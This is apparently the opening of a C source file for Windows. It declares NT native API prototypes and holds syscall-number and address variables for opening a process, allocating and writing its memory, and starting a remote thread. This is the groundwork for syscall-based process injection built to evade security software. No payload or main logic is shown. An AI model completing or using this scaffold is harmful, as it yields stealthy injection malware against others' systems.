#include <windows.h>  
#include <stdio.h> 
#include <psapi.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <string.h>

// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes
void SetConsoleColor(WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

extern NtOpenProcess(
	PHANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientId
);

extern NTSTATUS NtAllocateVirtualMemory(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);


extern NTSTATUS NtWriteVirtualMemory(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
);


extern NTSTATUS NtCreateThreadEx(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	PVOID ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID lpStartAddress,
	PVOID lpParameter,
	ULONG Flags,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer
);


extern NTSTATUS NtWaitForSingleObject(
	HANDLE Handle,
	BOOLEAN Alertable,
	PLARGE_INTEGER Timeout
);

void InitializeObjectAttributes(
	POBJECT_ATTRIBUTES pObjectAttributes,
	PUNICODE_STRING pObjectName,
	ULONG Attributes,
	HANDLE RootDirectory,
	PVOID SecurityDescriptor
) {
	if (pObjectAttributes == NULL) {
		return;
	}

	pObjectAttributes->Length = sizeof(OBJECT_ATTRIBUTES);
	pObjectAttributes->RootDirectory = RootDirectory;
	pObjectAttributes->ObjectName = pObjectName;
	pObjectAttributes->Attributes = Attributes;
	pObjectAttributes->SecurityDescriptor = SecurityDescriptor;
	pObjectAttributes->SecurityQualityOfService = NULL;
}


DWORD SSNtOpenProcess;
UINT_PTR AddrNtOpenProcess;
DWORD SSNtAllocateVirtualMemory;
UINT_PTR AddrNtAllocateVirtualMemory;
DWORD SSNtWriteVirtualMemory;
UINT_PTR AddrNtWriteVirtualMemory;
DWORD SSNtCreateThreadEx;
UINT_PTR AddrNtCreateThreadEx;
DWORD SSNtWaitForSingleObject;
UINT_PTR AddrNtWaitForSingleObject;